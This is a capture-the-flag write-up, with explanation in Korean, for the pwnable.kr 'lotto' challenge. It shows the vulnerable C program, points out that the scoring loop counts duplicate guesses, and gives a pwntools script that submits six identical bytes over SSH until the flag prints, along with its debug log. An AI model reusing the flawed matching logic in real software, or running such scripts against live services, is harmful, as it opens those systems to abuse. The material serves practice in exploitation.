# lotto

## lotto.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
	
	int i;
	printf("Submit your 6 lotto bytes : ");
	fflush(stdout);

	int r;
	r = read(0, submit, 6);

	printf("Lotto Start!\n");
	//sleep(1);

	// generate lotto numbers
	int fd = open("/dev/urandom", O_RDONLY);
	if(fd==-1){
		printf("error. tell admin\n");
		exit(-1);
	}
	unsigned char lotto[6];
	if(read(fd, lotto, 6) != 6){
		printf("error2. tell admin\n");
		exit(-1);
	}
	for(i=0; i<6; i++){
		lotto[i] = (lotto[i] % 45) + 1;		// 1 ~ 45
	}
	close(fd);
	
	// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}

	// win!
	if(match == 6){
		system("/bin/cat flag");
	}
	else{
		printf("bad luck...\n");
	}

}

void help(){
	printf("- nLotto Rule -\n");
	printf("nlotto is consisted with 6 random natural numbers less than 46\n");
	printf("your goal is to match lotto numbers as many as you can\n");
	printf("if you win lottery for *1st place*, you will get reward\n");
	printf("for more details, follow the link below\n");
	printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
	printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

	// menu
	unsigned int menu;

	while(1){

		printf("- Select Menu -\n");
		printf("1. Play Lotto\n");
		printf("2. Help\n");
		printf("3. Exit\n");

		scanf("%d", &menu);

		switch(menu){
			case 1:
				play();
				break;
			case 2:
				help();
				break;
			case 3:
				printf("bye\n");
				return 0;
			default:
				printf("invalid menu\n");
				break;
		}
	}
	return 0;
}
```

`play()`함수를 보면 `/dev/urandom`에서 랜덤 값 6개를 가져오고, 범위를 1~45 까지로 지정한다. 이후 값을 비교하는데, 여기서 오류가 있다.

```c
// calculate lotto score
	int match = 0, j = 0;
	for(i=0; i<6; i++){
		for(j=0; j<6; j++){
			if(lotto[i] == submit[j]){
				match++;
			}
		}
	}
```

랜덤으로 뽑힌 번호가 `1, 2, 3, 4, 5, 6`이라면, `1, 1, 1, 1, 1, 1`이라고 해도 6개가 맞은 것이 된다. 

## exploit.py

```python
from pwn import *

context.log_level = 'debug'

shell = ssh('lotto', 'pwnable.kr', 2222, 'guest')

length = 0;

r = shell.run('./lotto')

r.recv()

r.sendline('1')

r.recv()

r.sendline('!'*6)

length = len(r.recv())

while True:
	r.sendline('1')
	sleep(1)
	r.recv()
	r.sendline('!'*6)
	if (len(r.recv()) != length):
		break
```

```bash
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Opening new channel: 'stty raw -ctlecho -echo; cd . >/dev/null 2>&1;./lotto': Done
[DEBUG] Received 0x2e bytes:
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Submit your 6 lotto bytes : '
[DEBUG] Sent 0x7 bytes:
    '!!!!!!\n'
[DEBUG] Received 0x47 bytes:
    'Lotto Start!\n'
    'bad luck...\n'
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Submit your 6 lotto bytes : '
[DEBUG] Sent 0x7 bytes:
    '!!!!!!\n'
[DEBUG] Received 0x47 bytes:
    'Lotto Start!\n'
    'bad luck...\n'
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Submit your 6 lotto bytes : '
[DEBUG] Sent 0x7 bytes:
    '!!!!!!\n'
[DEBUG] Received 0x47 bytes:
    'Lotto Start!\n'
    'bad luck...\n'
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Submit your 6 lotto bytes : '
[DEBUG] Sent 0x7 bytes:
    '!!!!!!\n'
[DEBUG] Received 0x47 bytes:
    'Lotto Start!\n'
    'bad luck...\n'
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x1c bytes:
    'Submit your 6 lotto bytes : '
[DEBUG] Sent 0x7 bytes:
    '!!!!!!\n'
[DEBUG] Received 0x72 bytes:
    'Lotto Start!\n'
    'sorry mom... I FORGOT to check duplicate numbers... :(\n'
    '- Select Menu -\n'
    '1. Play Lotto\n'
    '2. Help\n'
    '3. Exit\n'
[*] Closed SSH channel with pwnable.kr
```